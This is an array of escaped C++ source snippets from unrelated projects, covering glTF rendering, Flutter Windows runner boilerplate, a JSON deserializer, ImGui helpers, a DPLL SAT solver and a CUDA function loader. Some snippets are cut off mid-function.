{\n            break;\n        }\n    }\n\n    return output_file_name;\n}\n\n// Calculate the bounding box of the scene\nvoid calculate_bounding_box(const tinygltf::Model &model, float &minX, float &minY, float &minZ, float &maxX, float &maxY,\n                          float &maxZ) {\n    minX = minY = minZ = std::numeric_limits<float>::max();\n    maxX = maxY = maxZ = std::numeric_limits<float>::min();\n\n    for (const auto &mesh: model.meshes) {\n        for (const auto &primitive: mesh.primitives) {\n            const tinygltf::Accessor &accessor = model.accessors[primitive.attributes.at(\"POSITION\")];\n            const tinygltf::BufferView &bufferView = model.bufferViews[accessor.bufferView];\n            const tinygltf::Buffer &buffer = model.buffers[bufferView.buffer];\n            const float *positions = reinterpret_cast<const float *>(&buffer.data[accessor.byteOffset + bufferView.byteOffset]);\n\n            for (size_t i = 0; i < accessor.count; ++i) {\n                float x = positions[i * 3];\n                float y = positions[i * 3 + 1];\n                float z = positions[i * 3 + 2];\n\n                minX = std::min(minX, x);\n                minY = std::min(minY, y);\n                minZ = std::min(minZ, z);\n                maxX = std::max(maxX, x);\n                maxY = std::max(maxY, y);\n                maxZ = std::max(maxZ, z);\n            }\n        }\n    }\n}\n\n// Set up the camera based on the bounding box\nvoid set_up_camera(float minX, float minY, float minZ, float maxX, float maxY, float maxZ) {\n    // Calculate center of the bounding box\n    float centerX = (minX + maxX) / 2.0f;\n    float centerY = (minY + maxY) / 2.0f;\n    float centerZ = (minZ + maxZ) / 2.0f;\n\n    // Calculate distance from the camera to the bounding box corners\n    float distanceX = std::abs(maxX - minX) / 2.0f;\n    float distanceY = std::abs(maxY - minY) / 2.0f;\n    float distanceZ = std::abs(maxZ - minZ) / 2.0f;\n    float distance = std::sqrt(distanceX * distanceX + distanceY * distanceY + distanceZ * distanceZ);\n\n    // Set up the camera\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity();\n    gluLookAt(centerX, centerY, centerZ + distance, // Eye position\n              centerX, centerY, centerZ, // Look-at position\n              0.0f, 1.0f, 0.0f); // Up direction\n}\n\n// Initialize OpenGL context and perform rendering via GPU\nvoid render_glb_with_opengl_gpu(const char *glb_file_path, const char *output_folder_path, const char *output_file_name,\n                                const char *file_type) {\n    int argc = 1;\n    char *argv[] = {strdup(\"RenderGLB+\"), nullptr}; // strdup() duplicates the string\n\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_RGB | GLUT_DOUBLE | GLUT_DEPTH);\n    glutInitWindowSize(800, 600);\n    glutCreateW",
    "#include <iostream>\nusing namespace std;\n\n// Base class which implements only two methods for showing content: print (virtual) and show (static)\nclass Base {\n   public:\n    // prints a fixed string on the standard output\n    virtual void print() {\n        cout << \"print base class\\n\";\n    }\n    // prints a fixed string on the standard output\n    void show() {\n        cout << \"show base class\\n\";\n    }\n};\n\n// Derived class which overwrites the virtual print method of the parent class\nclass Derived : public Base {\n   public:\n    // prints a fixed string on the standard output\n    void print() {\n        cout << \"print derived class\\n\";\n    }\n    // prints a fixed string on the standard output\n    void show() {\n        cout << \"show derived class\\n\";\n    }\n};\n\n// main entry point of the program\nint main() {\n    Base *p;\n    Derived derived;\n    p = &derived;\n\n    // Virtual function which gets resolved with a function pointer at runtime\n    p->print();\n\n    // Non-virtual function which is already resolved at compile time (and pointing to the wrong method)\n    p->show();\n\n    return (0);\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\n#include \"Thing.h\"\n\nThing::Thing\n(void)\n{\n  this->class_name = \"Thing\";\n  this->url = \"\";\n  this->model = \"\";\n  this->description = \"\";\n  this->sequence_num = 0;\n}\n\nbool\nThing::operator==\n(Thing another)\n{\n  // std::cout << \"Thing::operator == was called\\n\";\n  return ((this->sequence_num == another.sequence_num) &&\n\t  (this->url == another.url) &&\n\t  (this->model == another.model) &&\n\t  (this->description == another.description));\n}\n\nJson::Value *\nThing::dump2JSON\n()\n{\n  Json::Value * result_ptr = this->Core::dump2JSON();\n  \n  if (this->sequence_num != 0)\n    {\n      (*result_ptr)[\"sequence num\"] = this->sequence_num;\n    }\n\n  if (this->url != \"\")\n    {\n      (*result_ptr)[\"url\"] = this->url;\n    }\n\n  if (this->model != \"\")\n    {\n      (*result_ptr)[\"model\"] = this->model;\n    }\n\n  if (this->description != \"\")\n    {\n      (*result_ptr)[\"description\"] = this->description;\n    }\n\n  return result_ptr;\n}\n\nvoid\nThing::JSON2Object\n(Json::Value * arg_json_ptr)\n{\n  Exception_Info * ei_ptr = NULL;\n  ecs36b_Exception lv_exception {};\n\n  if (arg_json_ptr == ((Json::Value *) NULL))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_THING;\n      ei_ptr->which_string = \"default\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n      ei_ptr->what_code = ECS36B_ERROR_NULL_JSON_PTR;\n      (lv_exception.info_vector).push_back(ei_ptr);\n      throw lv_exception;\n    }\n\n  if ((arg_json_ptr->isNull() == true) ||\n      (arg_json_ptr->isObject() != true))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_THING;\n      ei_ptr->which_string = \"default\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if (arg_json_ptr->isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception.info_vector).push_back(ei_ptr);\n      throw lv_exception;\n    }\n\n  try\n    {\n      this->Core::JSON2Object(arg_json_ptr);\n    }\n  catch(ecs36b_Exception e)\n    {\n      int i;\n      for (i = 0; i < (e.info_vector).size(); i++)\n\t{\n\t  (lv_exception.info_vector).push_back((e.info_vector)[i]);\n\t}\n    }\n  \n  // \"url\"\n  if (((*arg_json_ptr)[\"url\"].isNull() == true) ||\n      ((*arg_json_ptr)[\"url\"].isString() == false))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_THING;\n      ei_ptr->which_string = \"url\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if ((*arg_json_ptr)[\"url\"].isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception.info_vector).push_back(ei_ptr);\n    }\n  else\n    {\n      this->url = ((*arg_json_ptr)[\"url\"]).asString();\n    }\n\n  // \"model\"\n  if (((*arg_json_ptr)[\"model\"].isNull() == true) ||\n      ((*arg_json_ptr)[\"model\"].isString() == false))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_THING;\n      ei_ptr->which_string = \"model\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if ((*arg_json_ptr)[\"model\"].isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception.info_vector).push_back(ei_ptr);\n    }\n  else\n    {\n      this->model = ((*arg_json_ptr)[\"model\"]).asString();\n    }\n\n  // \"description\"\n  if (((*arg_json_ptr)[\"description\"].isNull() == true) ||\n      ((*arg_json_ptr)[\"description\"].isString() == false))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_THING;\n      ei_ptr->which_string = \"description\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if ((*arg_json_ptr)[\"description\"].isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception.info_vector).push_back(ei_ptr);\n    }\n  else\n    {\n      this->description = ((*arg_json_ptr)[\"description\"]).asString();\n    }\n\n  // \"sequence num\"\n  if (((*arg_json_ptr)[\"sequence num\"].isNull() == true) ||\n      ((*arg_json_ptr)[\"sequence num\"].isInt() == false))\n    {\n      ei_ptr = new Exception_Info {};\n      ei_ptr->where_code = ECS36B_ERROR_JSON2OBJECT_THING;\n      ei_ptr->which_string = \"sequence num\";\n      ei_ptr->how_code = ECS36B_ERROR_NORMAL;\n\n      if ((*arg_json_ptr)[\"sequence num\"].isNull() == true)\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_MISSING;\n\t}\n      else\n\t{\n\t  ei_ptr->what_code = ECS36B_ERROR_JSON_KEY_TYPE_MISMATCHED;\n\t}\n      (lv_exception.info_vector).push_back(ei_ptr);\n    }\n  else\n    {\n      this->sequence_num = ((*arg_json_ptr)[\"sequence num\"]).asInt();\n    }\n\n  if ((lv_exception.info_vector).size() != 0)\n    {\n      throw lv_exception;\n    }\n\n  return;\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"example_pie_chart\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#pragma once\n#include \"imguipp.hpp\"\n\nnamespace imguipp\n{\n\n\tfloat getx()\n\t{\n\t\treturn ImGui::GetContentRegionAvail().x;\n\t}\n\n\tfloat gety()\n\t{\n\t\treturn ImGui::GetContentRegionAvail().y;\n\t}\n\n\tvoid button(const char* label, int& currentTab, int newTab, ImVec2 size)\n\t{\n\t\tif (ImGui::Button(label, size))\n\t\t\tcurrentTab = newTab;\n\t}\n\n\tvoid line(int newId)\n\t{\n\t\tstd::string id = (\"imguipp_line_\" + std::to_string(newId));\n\t\tImGui::PushStyleColor(ImGuiCol_ChildBg, IM_COL32(0, 0, 0, 0));\n\t\t{\n\t\t\tImGui::BeginChild(id.c_str(), ImVec2(ImGui::GetContentRegionAvail().x, 1), false);\n\t\t\tImGui::Separator();\n\t\t\tImGui::EndChild();\n\t\t}\n\t\tImGui::PopStyleColor();\n\t}\n\n\tvoid linevertical()\n\t{\n\t\tImGui::SameLine();\n\t\tImGui::SeparatorEx(ImGuiSeparatorFlags_Vertical);\n\t\tImGui::SameLine();\n\t}\n\n\tvoid center_text(const char* text, int lineId , bool separator)\n\t{\n\t\tif (text == nullptr)\n\t\t\treturn;\n\n\t\tImGui::Spacing();\n\t\tImGui::SameLine((ImGui::GetContentRegionAvail().x / 2) - (ImGui::CalcTextSize(text).x / 2));\n\t\tImGui::Text(text);\n\t\tImGui::Spacing();\n\n\t\tif (true == separator)\n\t\t\tline(lineId);\n\t}\n\n\tvoid center_text_ex(const char* text, float width_available, int lineId,  bool separator)\n\t{\n\t\tif (text == nullptr)\n\t\t\treturn;\n\n\t\tImGui::Spacing();\n\t\tImGui::SameLine(width_available);\n\t\tImGui::TextColored((ImVec4)ImColor(0, 191, 255, 255), text);\n\t\tImGui::Spacing();\n\n\t\tif (true == separator)\n\t\t\tline(lineId);\n\t}\n\n\tnamespace other\n\t{\n\t\tfloat get_window_size_x()\n\t\t{\n\t\t\treturn ImGui::GetWindowSize().x;\n\t\t}\n\n\t\tfloat get_window_size_y()\n\t\t{\n\t\t\treturn ImGui::GetWindowSize().y;\n\t\t}\n\n\t\tImVec2 get_window_size()\n\t\t{\n\t\t\treturn ImGui::GetWindowSize();\n\t\t}\n\n\t\tchar* get_window_name()\n\t\t{\n\t\t\treturn ImGui::GetCurrentWindow()->Name;\n\t\t}\n\n\t\tImDrawList* get_drawlist()\n\t\t{\n\t\t\treturn ImGui::GetCurrentWindow()->DrawList;\n\t\t}\n\t}\n\n\tImVec4 to_vec4(float r, float g, float b, float a)\n\t{\n\t\treturn ImVec4(r / 255.0, g / 255.0, b / 255.0, a / 255.0);\n\t}\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <algorithm>\n#include <errno.h>\n#include <fstream>\n#include <iostream>\n#include <set>\n#include <sstream>\n#include <string>\n#include <string.h>\n#include <vector>\n\n#define MAXVARS 1500\n\nusing std::vector;\nusing std::string;\nusing std::set;\n\nclass CNF {\n    int nvars;\n    bool empty = false;\n    vector<vector<int> > clauses;\n\n    // l - signed literal\n    bool is_pure(int l) const {\n        bool found = false;\n        for (const auto& v : clauses) {\n            for (int t : v) {\n                if (t == l) {\n                    found = true;\n                } else if (t == -l) {\n                    return false;\n                }\n            }\n        }\n        return found;\n    }\n\npublic:\n    static CNF* parse(const string& name) {\n        std::ifstream f(name);\n        if (f.fail()) {\n            std::cout << \"Cannot open file: \" << strerror(errno) << \"\\n\";\n            return nullptr;\n        }\n        string s;\n        int line = 0;\n        int nclauses;\n        string tmp;\n\n        CNF* result = new CNF();\n\n        while (1) {\n            line++;\n            std::getline(f, s);\n            if (s[0] == 'c')\n                continue;\n            if (s[0] == 'p')\n                break;\n            std::cout << \"Invalid DIMACS, unknown letter at line \" << line << \"\\n\";\n            return nullptr;\n        }\n        std::istringstream iss(s);\n        iss >> tmp >> tmp >> result->nvars >> nclauses;\n        if (result->nvars > MAXVARS) {\n            std::cout << \"too many vars\\n\";\n            exit(1);\n        }\n        for (int i = 0; i < nclauses; i++) {\n            vector<int> clause;\n            int literal;\n            std::getline(f, s);\n            std::istringstream iss(s);\n            set<int> used_literals; // for sanity checks\n            bool clause_always_true = false;\n\n            iss >> literal;\n            while (literal) {\n                if (used_literals.find(literal) != used_literals.end()) {\n                    iss >> literal;\n                    continue;\n                }\n                if (used_literals.find(-literal) != used_literals.end())\n                    clause_always_true = true;\n                used_literals.insert(literal);\n                clause.push_back(literal);\n                iss >> literal;\n            } while (literal);\n            if (!clause_always_true)\n                result->clauses.push_back(clause);\n        }\n        return result;\n    }\n\n    set<int> find_unit_clauses() const {\n        set<int> ret;\n        for (const auto& a : clauses) {\n            if (a.size() == 1)\n                ret.insert(a[0]);\n        }\n        return ret;\n    }\n\n    set<int> find_pure_literals() const {\n        set<int> ret;\n        for (int i = -nvars; i <= nvars; i++) {\n            if (i == 0) continue;\n            if (is_pure(i)) ret.insert(i);\n        }\n        return ret;\n    }\n\n    bool has_empty_clause() const { return empty; }\n    bool is_cnf_empty() const { return clauses.size() == 0; }\n\n    void propagate_var_single_value(int v) {\n        clauses.erase(std::remove_if(clauses.begin(), clauses.end(), [v](const vector<int>& c) { return std::find(c.begin(), c.end(), v) != c.end(); }), clauses.end());\n        for (auto& c : clauses) {\n            c.erase(std::remove_if(c.begin(), c.end(), [v](int l){ return l == -v; }), c.end());\n            if (c.size() == 0) {\n                empty = true;\n                return;\n            }\n        }\n    }\n\n    void propagate_var_values(const set<int>& vs) {\n        for (int v : vs) {\n            propagate_var_single_value(v);\n            if (empty)\n                break;\n        }\n    }\n\n    int select_branching_literal() {\n        return clauses[0][0];\n    }\n\n    bool solve_helper(vector<int>* acc) {\n        if (has_empty_clause()) return false;\n\n        // unit clauses\n        while (true) {\n            set<int> units = find_unit_clauses();\n            if (units.size() == 0) break;\n            if (units.size() > 1) {\n                for (int v : units) {\n                    if (units.find(-v) != units.end()) return false;\n                }\n            }\n            for (int v : units) acc->push_back(v);\n            propagate_var_values(units);\n            if (has_empty_clause()) return false;\n        }\n\n        // pure literals\n        while (true) {\n            set<int> lits = find_pure_literals();\n            if (lits.size() == 0) break;\n            for (int v : lits) acc->push_back(v);\n            propagate_var_values(lits);\n            if (has_empty_clause()) return false;\n        }\n\n        if (is_cnf_empty()) return true;\n\n        size_t acclim = acc->size();\n        int v = select_branching_literal();\n\n        // branching\n        {\n            // Create copy in heap, do not eat stack\n            CNF *cnf2 = new CNF(*this);\n            acc->push_back(v);\n            cnf2->propagate_var_single_value(v);\n            bool ret = cnf2->solve_helper(acc);\n            delete cnf2;\n            if (ret) return ret;\n        }\n\n        //",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chatapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// MIT License\n// \n// Copyright (C) 2018-2024, Tellusim Technologies Inc. https://tellusim.com/\n// \n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n// \n// The above copyright notice and this permission notice shall be included in all\n// copies or substantial portions of the Software.\n// \n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// SOFTWARE.\n\n#include <core/TellusimLog.h>\n#include <platform/TellusimContext.h>\n\n#include \"../include/TellusimCU.h\"\n\n/*\n */\nnamespace Tellusim {\n\t\n\t/*\n\t */\n\tnamespace CU {\n\t\t\n\t\t/*\n\t\t */\n\t\tbool init() {\n\t\t\t\n\t\t\t// function address\n\t\t\t#define GET_ADDRESS(TYPE, NAME) { \\\n\t\t\t\tNAME = (TYPE)CUContext::getProcAddress(#NAME); \\\n\t\t\t\tif(NAME == nullptr && is_core) { \\\n\t\t\t\t\tTS_LOGF(Error, \"CU::init(): can't get %s function\\n\", #NAME); \\\n\t\t\t\t\treturn false; \\\n\t\t\t\t} \\\n\t\t\t}\n\t\t\t\n\t\t\t// core functions\n\t\t\tbool is_core = true;\n\t\t\t\n\t\t\t// Cuda functions\n\t\t\tGET_ADDRESS(PFN_cuGetErrorString, cuGetErrorString)\n\t\t\tGET_ADDRESS(PFN_cuGetErrorName, cuGetErrorName)\n\t\t\tGET_ADDRESS(PFN_cuInit, cuInit)\n\t\t\tGET_ADDRESS(PFN_cuDriverGetVersion, cuDriverGetVersion)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGet, cuDeviceGet)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetCount, cuDeviceGetCount)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetName, cuDeviceGetName)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetUuid, cuDeviceGetUuid)\n\t\t\tGET_ADDRESS(PFN_cuDeviceTotalMem, cuDeviceTotalMem)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetAttribute, cuDeviceGetAttribute)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxRetain, cuDevicePrimaryCtxRetain)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxRelease, cuDevicePrimaryCtxRelease)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxSetFlags, cuDevicePrimaryCtxSetFlags)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxGetState, cuDevicePrimaryCtxGetState)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxReset, cuDevicePrimaryCtxReset)\n\t\t\tGET_ADDRESS(PFN_cuCtxCreate, cuCtxCreate)\n\t\t\tGET_ADDRESS(PFN_cuCtxDestroy, cuCtxDestroy)\n\t\t\tGET_ADDRESS(PFN_cuCtxPushCurrent, cuCtxPushCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxPopCurrent, cuCtxPopCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetCurrent, cuCtxSetCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetCurrent, cuCtxGetCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetDevice, cuCtxGetDevice)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetFlags, cuCtxGetFlags)\n\t\t\tGET_ADDRESS(PFN_cuCtxSynchronize, cuCtxSynchronize)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetLimit, cuCtxSetLimit)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetLimit, cuCtxGetLimit)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetCacheConfig, cuCtxGetCacheConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetCacheConfig, cuCtxSetCacheConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetSharedMemConfig, cuCtxGetSharedMemConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetSharedMemConfig, cuCtxSetSharedMemConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetApiVersion, cuCtxGetApiVersion)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetStreamPriorityRange, cuCtxGetStreamPriorityRange)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoad, cuModuleLoad)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoadData, cuModuleLoadData)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoadDataEx, cuModuleLoadDataEx)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoadFatBinary, cuModuleLoadFatBinary)\n\t\t\tGET_ADDRESS(PFN_cuModuleUnload, cuModuleUnload)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetFunction, cuModuleGetFunction)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetGlobal, cuModuleGetGlobal)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetTexRef, cuModuleGetTexRef)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetSurfRef, cuModuleGetSurfRef)\n\t\t\tGET_ADDRESS(PFN_cuLinkCreate, cuLinkCreate)\n\t\t\tGET_ADDRESS(PFN_cuLinkAddData, cuLinkAddData)\n\t\t\tGET_ADDRESS(PFN_cuLinkAddFile, 